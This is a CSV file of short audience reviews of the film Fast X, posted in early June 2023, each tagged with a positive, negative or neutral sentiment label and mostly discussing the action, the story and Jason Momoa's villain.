Date,Score,Reviews
"Jun 5, 2023",NEGATIVE,I'm a huge Fast fan…but this series just keeps getting worse and worse. It's sad because I think these movies could have easily stayed fun and enjoyable…but they've just become so dumb.
"Jun 5, 2023",NEGATIVE,"The movie, as usual, has many ""liar"" action scenes, ok... But the drama is akward. And the context in the countries where the history rolls... Zero previous research. Specially in Brazil. Dear god, ""Hernan Reyes""... We speak Portuguese! Fernando Reis, ok, it woul be a normal name. ""Dante""?... it's uncommon. The songs? The wear... The cars... Sprint race? The car is Gol, with AP motor, and an insane pressure of turbo... Or an Opala... Summary, very bad."
"Jun 5, 2023",POSITIVE,This movie has literally raised the bar since the last VIllian. Jason Mamoa was simple Excellent in his performance. The comedy sequences mixed with Action packed scenes tied in perfectly and really set the tone for Part 2 and 3. Looking forward for the next one.
"Jun 5, 2023",POSITIVE,It's  a franchise that keeps giving what it's meant to give. The plot twists and actions in this movie were superb. the new villain is a great boost to this movie franchise. The movie was all around great from the beginning to the Post credit scene.
"Jun 5, 2023",NEGATIVE,"What is wrong with the Spherical bomb?, rolling all over the city and unstoppable, this movies now are lame..."
"Jun 5, 2023",POSITIVE,Best fast and furious movie yet
"Jun 5, 2023",POSITIVE,Movie was another action packed film with great actors and leaves you in disbelief throughout the movie with some surprises @ the end
"Jun 5, 2023",NEUTRAL,"I've loved almost all of the fast franchise so far. Especially the last one but this one had all the action I was expecting, yet it felt like for no reason there was a very weak story which made it all feel like for nothing. But action still is action."
"Jun 5, 2023",POSITIVE,loved the action non stop. never disappoints
"Jun 5, 2023",POSITIVE,Action from start to finish! It was better than some of the other ones Ive seen. It didnt disappoint!
"Jun 5, 2023",POSITIVE,Jason Momoa is another awesome villain.
"Jun 5, 2023",NEUTRAL,"It was a decent movie, but jumped the shark years ago. Only saw this one because it was free. Wouldn't pay to see it, and kinda burned out on this franchise."
"Jun 5, 2023",POSITIVE,Fast paced.. adrenaline pumping action packed movie
"Jun 5, 2023",NEGATIVE,"It's surprisingly refreshing every time that Jason Momoa is on screen, he is a great villain for an otherwise dreadfully boring movie. If fast and furious nine hadn't convinced you that this franchise was in the dump then Fast X sure gives you a whole new reason why! This movie is so astoundingly bad for this franchise it's funny. If Vin Diesel hasn't learned how to act after 10 movies then I'm just going to assume he will never figure it out."
"Jun 5, 2023",POSITIVE,I love it soooo much
"Jun 5, 2023",POSITIVE,"I don't care what would the critics say, I haven't had this much joy in cinema for a long time !"
"Jun 5, 2023",POSITIVE,liked the movie a lot! Action was fast and furious. LOL I was not a fan of how it ended but would have planned to see another in any case.
"Jun 5, 2023",NEGATIVE,"I tried to watch the movie, but it's just a waste of time."
"Jun 5, 2023",POSITIVE,"Definitely kept your attention the whole time, on the edge of your seat! I liked how there's a large pool of past characters to draw from. Be prepared to be thrown for a loop at the end, as this series tends to do. I recommend seeing it for sure if you follow the series."
"Jun 5, 2023",NEGATIVE,This is a kid’s movie
"Jun 5, 2023",NEGATIVE,Genuinely so awful. The script was so bad. The action was not even good. The only good part of the movie was the driving scenes and fight scenes. Nothing made any sense. The direction they went with this movie was terrible.
"Jun 5, 2023",POSITIVE,Good action waiting for the next movie to come out
"Jun 5, 2023",POSITIVE,Always love fast and the furious movies
"Jun 5, 2023",NEUTRAL,Did not like the way it ended.
"Jun 5, 2023",POSITIVE,Didn't like that it is in 2 parts...
"Jun 5, 2023",POSITIVE,2 words purple Cadillac
"Jun 5, 2023",NEGATIVE,Ended stupid and kept talking about Family… movie was cringy.
"Jun 4, 2023",POSITIVE,Jason Momoa is hysterically funny. Absolutely love the tribute to Paul Walker.
"Jun 4, 2023",POSITIVE,Lots of action and car crashes.
"Jun 4, 2023",NEUTRAL,ok but getting stale and even DJ's return might not move it forward again
"Jun 4, 2023",POSITIVE,"ChatGPT

Fast X is a thrilling two-hour, 21-minute ride that takes you across multiple cities, from Los Angeles to Rome, Rio, Portugal, and London. Director Louis Leterrier makes the most of his budget, delivering exhilarating action scenes like a bomb bouncing through the streets of Rome and a massive vault being dragged through Rio. While it doesn't reach the same level of outlandishness as Fast 9's space stunt, the film still packs a punch. The story kicks off with a gripping flashback, pulling Dominic Toretto out of his peaceful life and into a collision with the vengeful Dante Reyes, son of a drug lord. Jason Momoa injects the film with a burst of energy, bringing a unique and intense performance. After over 20 years, the cast may not be as fast or furious, but Momoa's presence revitalizes the sequel."
"Jun 4, 2023",POSITIVE,I did not like the ending.
"Jun 4, 2023",POSITIVE,I enjoyed everything about the movie!
"Jun 4, 2023",POSITIVE,Loved this movie! Lovers of this franchise should stick until the end credits. You're in for a surprise!!
"Jun 4, 2023",NEGATIVE,The worst fast x movie yet. Don’t waste your money by watching in theater.
"Jun 4, 2023",POSITIVE,Cliff hangerj ready now for next movie
"Jun 4, 2023",POSITIVE,I wish the second part would come out soon. I cannot wait to see what happens.
"Jun 4, 2023",POSITIVE,"Absolutely the best Fast and Furious movie in the franchise thanks to the ""Joker-like"" performance of Jason Momoa and building off of what is now the second-best movie in the franchise, Fast Five."
"Jun 4, 2023",POSITIVE,"action packed, loud. Enjoyed"
"Jun 4, 2023",POSITIVE,This movie was action-packed. All the way to the end.
"Jun 4, 2023",POSITIVE,The movie was dope and hilarious in a F&F way!!
"Jun 4, 2023",NEGATIVE,"The stings were so ridiculous, I couldn't even enjoy the movie.  Paul Walker is cringing in the afterlife"
"Jun 4, 2023",POSITIVE,I read a bunch of reviews that said it wasnt as good as the previous movies and honestly I felt like the reviews were a lie. This movie was great! I love all the cameos and cannot wait for the next movie!
"Jun 4, 2023",NEUTRAL,Definitely action but a lot of impossible stunts
"Jun 4, 2023",NEGATIVE,"Eeerrrm oh dear after number 9 the franchise needed to redeem itself but sadly I gave up after an hour and thought I'd cut my eyelids off and face the sun instead

Only redeeming feature is JM as Dante 

Wait for streaming"
"Jun 4, 2023",POSITIVE,"action, morals, values-- awesome"
"Jun 4, 2023",POSITIVE,It was action packed! Full of surprises! And everything you expecting and love about Fast and Furious!
"Jun 4, 2023",POSITIVE,"Most fast fans will disagree but Jason mamoa was outstanding, the character portrayal was great as well he is by far the greatest villain the fast franchise has ever had ignore the stunts why should it only be about street racing when we're all seeing the the evolution in each movie let's forget those that didn't deliver and continue enjoying the coming movies for I look forward to even seeing Tyrese Gibson's performance once more."
"Jun 4, 2023",NEUTRAL,"Mid asf, I spent the entire time watching it just thinking ""why continue this franchise"" but then i remembered these studios care more about cash than making good movies, it had some cool action I guess but thats the whole of it, they should have stopped at fast 7, paul walkers legacy shouldn't be this shit, this franchise once stood for something and it was great but now all they care about is having boomers come and fill up the studios pockets."
"Jun 4, 2023",NEUTRAL,Unreal  not as good as past movies.
"Jun 4, 2023",NEGATIVE,"I fell asleep. Also the overarching woke agenda was rather annoying, creating an unrealistic plot."
"Jun 4, 2023",NEGATIVE,alright movie could have easily fit it all in 1 movie tho didnt even need a 10 nevermind an 11
"Jun 4, 2023",NEGATIVE,"Momoa's character is terrible, worst villain ever seen, decent action scenes, exaggerated as usual, a lot of random BS in every plan but you know is Fast and Furious..."
"Jun 4, 2023",NEGATIVE,"No acting, no story - just a stupid movie that was a complete waste of time"
"Jun 4, 2023",NEUTRAL,"After the disappointments that were 8 & 9, I went into Fast X with zero expectations, which is why I actually had a fun ride. Hits every ""family"" story you expect but does it in a Furios 7/Fast 6 way - which left me entertained.
Lastly, a cliffhanger ending which doesn't take away from the entertainment factor."
"Jun 4, 2023",POSITIVE,Really enjoyed it!! Cant wait for the next movie!!
"Jun 4, 2023",POSITIVE,"This film is over the top utterly bonkers and lots of fun, if your a fan of the past FF films you will love this."
"Jun 4, 2023",POSITIVE,Love all of them can't wait till furious 11!
"Jun 4, 2023",NEUTRAL,"Much better then F9, but it may be too late, the franchise is ending and if we still get these ""okay"" movies I feel the franchise will be wasted."
"Jun 4, 2023",POSITIVE,I disliked the ending. Not knowing who was alive or dead and how you brought back a dead girl again! And an Abuela that makes her first appearance in 10!
"Jun 4, 2023",POSITIVE,"you just gotta see for yourself! it's good  a whole roller coaster ride.  your nerves will need a stiff drink afterwards,  but it'll be worth it."
"Jun 4, 2023",NEGATIVE,"Jason Momoa is a great Villain. Other than that, skip this movie and hope he's in a better one with the same role..."
"Jun 4, 2023",POSITIVE,loved it so much! Never dissapoints♡
"Jun 4, 2023",POSITIVE,"Goofy, over the top, silly one liners my 4th grader could’ve written. With that said, it was so fun to watch in the theaters. Even though I frequently laughed at scenes and lines that weren’t designed to be funny I really enjoyed it. "
"Jun 4, 2023",POSITIVE,Always great stunt scenes but left us hanging...how long will we have to wait for answers?
"Jun 4, 2023",POSITIVE,Lots of action and comedy.  Everyone played their roles to perfection. A must see!
"Jun 4, 2023",POSITIVE,"A modern classic, Fast X delivers more of what people pretend they don't want and then watch sooner or later anyway."
"Jun 4, 2023",NEUTRAL,I love f&f movies this one is too much. the entire thing requires you to ignore obvious logistical issues and impossibilities.
"Jun 4, 2023",POSITIVE,"Love the franchise, always will! But this movie has me wanting to go back and see it a second time!"
"Jun 4, 2023",NEGATIVE,Probably the worst F & F movie yet. Jason Mamoa’s character is terrible. He’s attempting to be like the Joker & it falls flat.
"Jun 4, 2023",NEGATIVE,"The film lacks a solid storyline, leaving viewers confused and disconnected. The excessive focus on mindless action sacrifices character development and dialogues, resulting in a forgettable viewing experience. The performances feel uninspired, lacking the chemistry and authenticity that made previous films enjoyable. The film relies too heavily on CGI, sacrificing realism. Fast X offers nothing new or original. Overall, it's disappointing and fails to capture the excitement and depth of the first few Fast and Furious movies."
"Jun 4, 2023",NEUTRAL,Didnt like it will be in 2 parts. Thought the campy playful villain was completely not necessary.
"Jun 4, 2023",NEUTRAL,The ending was horrible and not much racing
"Jun 4, 2023",NEGATIVE,"Title of the review: ""Fast & Furious 10: A Worn-Out Formula that Fails to Deliver Freshness""

Since its original release over two decades ago, the ""Fast & Furious"" saga has been known for its high-octane action, epic chase scenes, and charismatic cast. However, with its tenth installment, titled ""Fast & Furious 10,"" it becomes clear that the formula has lost much of its original shine. This film is a perfect example of how a franchise can wear thin and lose its sense of novelty and excitement.

Directed by Louis Leterrier, known for his work in other action films, ""Fast & Furious 10"" promised to be a triumphant return to the roots of the franchise and an opportunity to revitalize it. However, what we find on screen is a collage of clichés and predictable situations that barely manage to hold the viewer's interest.

The cast, composed of famous names like Vin Diesel, Jason Momoa, Jason Statham, and Michelle Rodriguez, cannot rescue the film from its messy and predictable script. While each of them does their best with the characters they are given, their performances are not enough to compensate for the lack of character development and uninspired dialogue.

The biggest problem with ""Fast & Furious 10"" lies in its desperate attempt to surpass the action sequences of previous installments. Instead of offering something new and exciting, the driving sequences and vehicle confrontations feel repetitive and exaggerated to the point of disbelief. It seems that the franchise has lost the balance between action and coherence, sacrificing logic in the name of spectacle.

Furthermore, the excessive runtime of the film, at 141 minutes, only contributes to making the experience more exhausting. As the plot drags on, viewers are forced to endure unnecessary subplots and underdeveloped secondary characters that don't add anything meaningful to the main story.

In summary, ""Fast & Furious 10"" is a clear example of a saga that has lost its shine. With a predictable plot, shallow characters, and over-the-top action sequences, the film becomes a tired and worn-out exercise of what used to be an exciting franchise. While die-hard fans of the series may find some moments of entertainment, those seeking a fresh and stimulating cinematic experience will be disappointed. It is time for the ""Fast & Furious"" franchise to rethink its approach and find a new direction if it wants to remain relevant in the landscape of action cinema."
"Jun 4, 2023",POSITIVE,"Undoubtedly the best film in the saga after the 5th and 7th. Much funnier than the 9th chapter, and also more realistic, there are the usual over-the-top action scenes (I would have been disappointed if there weren't) but at least it doesn't take Roman and Tej into space. The Infinity War-like structure works so much because you don't notice the (relatively) long duration thanks to characters being split into multiple groups, fast-paced action scenes, the new ultimate villain and a pending ending for part 2. Vin Diesel seems to be the only one taking himself seriously, and this also works. Jason Momoa is basically a Joker version, John Cena is Peacemaker, and new and returning characters played by Brie Larson, Daniela Melchior and Jason Statham are all great and I would have liked to see more of them."
"Jun 4, 2023",NEUTRAL,"Too much of a setup for the next one? Nice flashbacks though. Pairing Letty & Cipher confusing, guess TBD. Didn't Mia and Bryan have 2 kids (frolicking on the beach in a previous film that was Paul Walker's last appearance) What happened to them? Or are they in an undisclosed location with Bryan?"
"Jun 4, 2023",NEGATIVE,Worst Fast and the Furious I’ve seen. Never have I fallen asleep at the theater until today
"Jun 4, 2023",NEGATIVE,ooh my god mhat a stupid movie in the last 30 or 40 minutes i expect super man or spider man to show up...
"Jun 4, 2023",POSITIVE,"I loved the movie because it was so authentically fast and furious lol. Yes, in some shape or form the movies are always basically the same but that's what makes it so great and you can't even be mad at it. The saga never fails to disappoint and will give you everything you'd expect for a fast film. The fact that they cameoed every single character possible into the movie was just pure gold and  hilarious. Definitely enjoyed this and look forward to part two."
"Jun 4, 2023",POSITIVE,Awesome movie with full of action!!!
"Jun 4, 2023",POSITIVE,left a lot of questions leading into various directions. overall a good movie.
"Jun 4, 2023",POSITIVE,Impressed with Dominic Toretto’s seemingly lack of neck and back pain at this point in the franchise
"Jun 4, 2023",POSITIVE,It was so action packed and the villian was hilarious!!!
"Jun 4, 2023",POSITIVE,i liked the characters and the story line and the incredible car chase scenes.the only thing i didnt like was that Alan Ritchson was a villain .
"Jun 4, 2023",POSITIVE,Cant wait for the next FastLifeLoveTheThrills
"Jun 4, 2023",POSITIVE,I like to keep the same crew like a family
"Jun 4, 2023",POSITIVE,Such a good one it was funny and good action!
"Jun 4, 2023",POSITIVE,"I loved the movie, I wanted more. But I guess I got to wait for the next installment."
"Jun 4, 2023",NEUTRAL,Had a lot of fun with this one! Wish it was a long big movie and didn’t have to wait for 2 other parts but I can’t wait for them!
"Jun 4, 2023",POSITIVE,cool film but left on cliff hanger so 1 star
"Jun 4, 2023",NEGATIVE,More of the same.  Terrible dialog and unrealistic stunts. Two hours of wasted time and money.
"Jun 4, 2023",POSITIVE,Corny but really good. Bestt one yet.
"Jun 4, 2023",POSITIVE,great movie. don't like the ending
"Jun 4, 2023",POSITIVE,absolutely loved the movie! hate having it end without a normal ending though! can't wait for the next one!
"Jun 4, 2023",POSITIVE,Love everything about and left me with so many questions in answered. Can't wait for the next one.
"Jun 4, 2023",NEGATIVE,"It was literally terrible, wanted to get up and leave half way through the movie, if your a loyal fast and furious fans just save your time and money, terrible"
"Jun 4, 2023",POSITIVE,"Great movie, however just like all previous Fast and Furious movies it features a lot fast cars and plenty of hot female characters."
"Jun 4, 2023",POSITIVE,I would recommend taking your kids and family to watch it it’s AMAZING
"Jun 4, 2023",NEUTRAL,"Jason Momoa’s role was fun, otherwise it was pretty meh and rather corny."
"Jun 4, 2023",POSITIVE,"Action packed, great plot"
"Jun 4, 2023",POSITIVE,It was better than Fast 9
"Jun 4, 2023",POSITIVE,"Fun for whole family, thrilling, and very action-packed"
"Jun 4, 2023",NEUTRAL,"Fast X is the tenth and second-last installment in the Fast & Furious franchise, which has thrilled fans with its action-packed and heartfelt stories for over two decades. The film is directed by Louis Leterrier, who replaced Justin Lin due to creative conflicts. It follows Dom Toretto (Vin Diesel) and his crew as they face their most formidable foe yet: Dante Reyes (Jason Momoa), the son of a drug lord they killed in Fast Five.

The film is a love letter to the loyal fans of the franchise, as it revisits and honors many of the previous films and characters. It also features an amazing cast of old and new stars, including Michelle Rodriguez, Tyrese Gibson, Ludacris, John Cena, Nathalie Emmanuel, Jordana Brewster, Sung Kang, Helen Mirren, Brie Larson, Rita Moreno, Jason Statham, Charlize Theron, and more.

Fast X delivers what it promises: stunning stunts, exotic locations, fast cars, and witty banter. The film takes the action to a new height, with scenes that defy the laws of physics and logic. The film also pays homage to its roots by referencing or recreating some of the most iconic moments from the series.

However, the film also has some drawbacks that weaken its impact as the series' climax. The plot is complicated and implausible, relying on too many coincidental and illogical twists. The dialogue is corny and repetitive, with Dom constantly lecturing about family and loyalty. The action scenes are exaggerated and unrealistic. The film's duration is too long, dragging for more than two hours without much variation or surprise.

The film also shines thanks to Jason Momoa's performance as Dante Reyes, who is a charismatic and ruthless villain. He brings a sense of danger and intensity to the role, making him a worthy adversary for Dom. He also has some emotional depth and motivation for his actions, as he blames Dom for destroying his family's legacy.

Fast X is a mixed bag of a movie that will please die-hard fans of the franchise but disappoint others who expect more from a blockbuster finale. It is a fun and flashy spectacle that delivers on action and star power but lacks story and logic. It is not the best or the worst of the series, but somewhere in between."
"Jun 4, 2023",POSITIVE,It was worth watching to see all the well-know actors and actress of the FF franchise. Very interesting plot and the end was something phenominal. For sure there is FF 11 coming out sometime..
"Jun 4, 2023",NEUTRAL,"Great action movie. It has all the ingredients. The Fast and Furious story ended with Furious 7. Everything from F8 and onward have been good to great action movies but aren't related to the essence of what we loved about the movies. This one was very entertaining though, despite not be needed for, or related to, the core story."
"Jun 4, 2023",POSITIVE,FREAKIN AWESOME!!!!!!! Never a dull moment
"Jun 4, 2023",POSITIVE,The Fast franchise NEVER disappoints. It was an incredible roller-coaster ride. Jason Momoa definitely gave it a new angle. You'll know what I mean when you see it. What a great Saturday night. Just go see it. You'll be glad you did. Enjoy.
"Jun 4, 2023",NEGATIVE,It was mid. I admire the funny moments here and there but overall it’s very mid and could’ve been done better.
"Jun 4, 2023",NEUTRAL,Now I have seen everything
"Jun 4, 2023",POSITIVE,Time flew by. It keep your attention every minute.
"Jun 4, 2023",POSITIVE,Almost as good as part 1
"Jun 4, 2023",NEGATIVE,Fell asleep 2 or 3 times
"Jun 4, 2023",NEGATIVE,so bored and unrealistic movie
"Jun 4, 2023",POSITIVE,"Movie was actually really good and entertaining, look forward to the next!"
"Jun 4, 2023",NEGATIVE,Stairs. Stairs. Stairs. Stairs.
"Jun 4, 2023",NEGATIVE,Redo of a redo of a redo....and on and on! Make it stop!
"Jun 4, 2023",POSITIVE,Unbelievable!! That was one of the best fast and the furious movies in the franchise! Can't wait for the next one
"Jun 4, 2023",POSITIVE,Real good!! The ending piss me off  Now I have to wait til 2025 to see Aqua man die
"Jun 4, 2023",POSITIVE,"best one yet, gr8 action"
"Jun 4, 2023",POSITIVE,"I like the whole series and have watched every movie. I just hate seeing the unbelievable stunts. I laugh at all of the ridiculous stunts. They kind of went off the rails with effects after the second or third movies. I know its not real, but come on"
"Jun 4, 2023",NEGATIVE,The play role when out of the course.
"Jun 4, 2023",NEUTRAL,This is the one where Captain Marvel takes out Aqua Man
"Jun 4, 2023",POSITIVE,"Loved the movie. We have seen all of them, they are great."
"Jun 4, 2023",NEUTRAL,"Mamoa was wonderful throughout. The rest of the movie I just wondered when he'd be back.

Also, it's PART ONE, not a full movie. There is no rise and fall, terrible pacing, and a terrible cliffhanger of an ending."
"Jun 3, 2023",POSITIVE,Lots of action. Funny also.
"Jun 3, 2023",NEUTRAL,"While not an Infinity War-level game-changer, Fast X is a satisfying and entertaining enough pre-cursor to the franchise's inevitable end."
"Jun 3, 2023",POSITIVE,Over the top yet entertaining at the same time
"Jun 3, 2023",POSITIVE,I thought it was great movie with abundant action from beginning to end!
"Jun 3, 2023",POSITIVE,"I loved your app, very easy to use"
"Jun 3, 2023",POSITIVE,"It was a good movie, kept me on the edge of a seat to the end"
"Jun 3, 2023",POSITIVE,The show was absolutely awesome
"Jun 3, 2023",POSITIVE,"Fast paced, good story with an over the top, wacky expressive villain with cookie cutter over the top action sequences and explosions. You expect this in an action thriller. There were a few dull moments, but the story moved along quite nicely. Nothing you haven't seen before.

All the main characters from the previous movies were in play. All played their roles like troopers. Charlize Theron and Michelle Rodríguez got into a scuffle which was the only real fight scene in the whole movie. Hope to see more of Brie Larson kick some butt as Ms Nobody.

This cliff hanger set up the finale in the next installment. Don't know if they can stretch this into a 3 parter.

Overall I give it a 8.5/10. Not fantastic, but not bad either. Would certainly see it on IMAX!!"
"Jun 3, 2023",POSITIVE,I just can't wait til part 2 and 3..cuz I have more questions then answers..lol..but Momoa played his part extremely well...
"Jun 3, 2023",NEGATIVE,"Overall i liked the movie, plot was chaotic and it was intense almost all the way. But Jason's portay of the bad guy was so cringe. So many unnecessary scenes with him just trying to be comically and failing so hard. It just didn't fit the movie to have these completely different scenes where Jason was supose to be funny. Not gonna recommend it to anyone else and I'm not coming for the sequels."
"Jun 3, 2023",POSITIVE,Another awesome Fast movie.  Make sure to watch Fast 5 before this one.  It will help with the story line.
"Jun 3, 2023",POSITIVE,"I loved everything about it from old Clips to original people. It was pretty cool, I like it."
"Jun 3, 2023",POSITIVE,"It’s soo good, but the just can’t leave us like that 😭😭😭"
"Jun 3, 2023",POSITIVE,Leaves you hangin 🔥
"Jun 3, 2023",NEGATIVE,"Lots of action but, definitely the worst of the series.  IMO, disjointed, confusing, all over the place."
"Jun 3, 2023",POSITIVE,"I loved it!  And Im pretty sure they'll be a Fast 11 after seeing it too, which makes me even happier!  It was a little different than the others, but still had a lot of exciting action!  Great job!!"
"Jun 3, 2023",NEUTRAL,"Despite Jason Momoa's underwhelming performance, I enjoyed Fast X. His chemistry with Vin Diesel was lacking, and his inconsistent and chaotic acting stood out as one of the weakest in the series. However, the action, while not as insane as previous films, still had enough moments to entertain and amuse me. The movie strikes a balance between acknowledging its own absurdity without going into parody, which I appreciated.
Additionally, the practical effects used in the film were a welcome sight and added to the overall experience."
"Jun 3, 2023",POSITIVE,"Action, Love it.😆😂"
"Jun 3, 2023",NEUTRAL,The movie has good special effects. The script is poorly written. The screen writers are awful at Hollywood.  Hollywood movies are bad. I enjoyed watching the fast and furious movies when they came out . Please fix the movies. Get somebody who can write a screenplay.
"Jun 3, 2023",NEGATIVE,So bad it's like a parody.
"Jun 3, 2023",POSITIVE,Fun but so stupid. I do love these flicks.
"Jun 3, 2023",NEGATIVE,"Poco que decir, salvo que es más de lo mismo."
"Jun 3, 2023",NEUTRAL,"good ,but terrible ending"
"Jun 3, 2023",NEGATIVE,"Creo que hay un punto en que la acción se convierte en ridicules, y estas películas hace tiempo que lo alcanzaron. Sin contar el uso exagerado del CGI, la historia es una parodia de si misma intentando introducir plot twists cada vez mas ridículos, solo para intentar justificar su propia existencia..."
"Jun 3, 2023",POSITIVE,"it was captivating, intertaining. I'm looking forward to the sequel"
"Jun 3, 2023",POSITIVE,This was fun and definitely entertaining. In My top 3 out of all the these movies . 
"Jun 3, 2023",POSITIVE,"Tell the critics to f-off that's what they were doing. However utter nonsense that they are putting out to the big screen, it sure as HELL entertaining. In fact it's like a mix of Bollywood hyper-intensity with the star power comparable to the Avengers."
"Jun 3, 2023",NEGATIVE,"Jason Momoa was the single best thing about this movie. Vin Diesel could could barely keep his own eyes open for most of the movie. Simple script, big explosions and minimal clothing. Great for international audiences."
"Jun 3, 2023",NEUTRAL,"Jason Momoa stole the show. You could tell he was having fun with that role. The rest was as over the top as usual, with vehicles that laugh at the laws of physics. It was heavily action packed and you won't be bored. The perfect movie to shut your brain off with."
"Jun 3, 2023",NEUTRAL,"It was the same as the last several fast.... movies. Blowing up cars, planes, buildings and on and on it goes. They even leave a nice cliffhanger for episode 11. Come on really!!"
"Jun 3, 2023",NEUTRAL,"A.It's very digital. The scenes you could see that they were digitally enhanced.  B.Jason Mamoa's character reminded me of The Joker in Batman. Little quirky, the odd personality of evil. Well done by Mamoa. I do think he should had been listed higher up of actors. Regardless of a posted statement, I read, saying Mamoa ""overacted"", he played it like i believe it was scripted, like Jim Carrey also plays the quirky odd characters. C. There are many drama parts in this movie. You have to keep track of who and where the characters are going. D. There were emotional sections of remembrance. E. As a Grandma, I believe 8yr olds could see this with parents. No vulgarity or nudity was overwhelming.  F. Stay after the credits. There's the hint of whats next. 
G.  I strongly advise, before seeing, have an overload movie night/weekend of all the FF series, in order because this one includes them in some way and you might get lost. (B1- I'm just a little prejudice for Mr. Momoa as I'm a Norwalkian of Iowa. So, Ill buy the dvd for that reason.) Enjoy this flick and don't forget the popcorn before it starts."
"Jun 3, 2023",NEUTRAL,Bout time Dom got serious about protecting his family.  Only took 10 movies.
"Jun 3, 2023",POSITIVE,"Loved the craziness of Jason Manias character.  Disliked the character of Charlize Theron, cannot make a friend out of someone who killed your babys mother."
"Jun 3, 2023",NEGATIVE,I went to sleep a few times during the movie. It just didn't keep my attention.
"Jun 3, 2023",POSITIVE,"Loved Fast X. This movie was action-packed from the beginning to the end. There was so many twists and turns, that I didn't know what was going to happen next and to whom. It was a long one, but you were engaged and on the edge the entire time. Stay to the very end, there is more after the credits."
"Jun 3, 2023",NEUTRAL,"I think so is a big dumb, but, I love this franchise! watching this actors are part of my life on the cinema"
"Jun 3, 2023",POSITIVE,Plenty of action and suspense. There will be an XI
"Jun 3, 2023",NEGATIVE,"Vamos todos entrar em um consenso (incluindo você Vin Diesel) de que Velozes e Furiosos ACABOU. Não tem mais oque ser contado sobre essa família enjoativa. Essa franquia simplesmente irá encontrar pelo em ovo em seu décimo primeiro filme. Em seu décimo segundo, com toda certeza, Vin Diesel explorara o multiverso. São personagens que não morrem, como disse certa vez uma jovem sábia : Precisamos matar os personagens, como fazem em Game of Thrones. Sou brasileira e eu odeio como os filmes estrangeiros representam o Brasil, onde os atores e atrizes são mais espanhóis e mexicanos do que brasileiros."
"Jun 3, 2023",POSITIVE,nói chung phim cũng hay nhưng cái kết hơi hụt hẫn
"Jun 3, 2023",NEUTRAL,It's never ending... we are on number 10 and obviously there will be another the way they ended it with no closure.
"Jun 3, 2023",POSITIVE,a lot of wild car seens
"Jun 3, 2023",NEUTRAL,"eventhough it doesn't make any sense it was fun to watch, jason momoa was the best part"
"Jun 3, 2023",NEUTRAL,Too much killing and crashes that appeared fake as the Charger could never survive the crashes and still be drivable. Would not recommend.
"Jun 3, 2023",POSITIVE,AWESOME LOVED THE MOVIE
"Jun 3, 2023",POSITIVE,"phim hay, diễn xuất oke"
"Jun 3, 2023",NEGATIVE,There are two types of films that entertain me. Bad movies and good ones. This is one of the bad ones. The glimmer of hope with a classic car race was cut short to bring more pointless action scenes. So much love for Jason Mamoa but maniacal villain? That's not the guy.
"Jun 3, 2023",NEUTRAL,Movie jumps from too many places
"Jun 3, 2023",NEGATIVE,Story was all over the place. The ending was horrible and characters were only introduced for the hype this is definitely the worst movie yet and I was such a F&F fan
"Jun 3, 2023",POSITIVE,Put your brain in neutral and enjoy. Much more fun than the last few entries!
"Jun 3, 2023",NEGATIVE,"Same old, same old.
FAMILY!   
The only line he knows. 
Boring, overdone."
"Jun 3, 2023",NEGATIVE,Es una película obsesionada con el tema de la familia que le quita adrenalina y la convierte en una novela dramática.
"Jun 3, 2023",NEGATIVE,"Sucks !! I want my refund. 
They should have stopped this series I mean these movies when Paul died. I regret every dollar I paid for it. Never again. They are lost without My Paul."
"Jun 3, 2023",POSITIVE,"very cheesy as any fast and furious movie would be, the storyline is what keeps me hooked!"
"Jun 3, 2023",POSITIVE,"I loved this movie.  I AM A FAN OF JASON MAMOA, so I really enjoyed watching this movie!  I never get tired of all the action."
"Jun 3, 2023",POSITIVE,"It's better than the last few installments. It's clearly setting up for part two, so you have to take story build into consideration. Jason Momoa is in a league of his own with Dante. I'm glad we're getting a few movies with this character because watching Jason's villain makes you wonder where he's been this whole series. Momoa alone is worth seeing the movie. However, if you like fun in general, and have liked the past movies for the joy of them, it's worth the ticket admission too."
"Jun 3, 2023",POSITIVE,Great story as always. Jason Momoa is truly a badass villain in this one! It was a love and hate ending.... But looking forward to the next one!
"Jun 3, 2023",NEUTRAL,These are getting too far out there. I get the fast-paced and racing high-speed scenes. there were several that were completely unbelievable... I definitely liked the others better.
"Jun 3, 2023",NEGATIVE,Repeat of every other one
"Jun 3, 2023",POSITIVE,Can't wait till the final!!!!
"Jun 3, 2023",POSITIVE,Great movie. Non-stop action. Fantastic but if entertainment.
"Jun 3, 2023",POSITIVE,"Jason Momoa made this movie great!   He is such a treat to watch.  Is it over the top and ridiculous, yes!   But if you are a fan of the franchise, you will enjoy it!   Im hoping to see a Stinger racing in the next one!"
"Jun 3, 2023",NEUTRAL,good. action packed. family
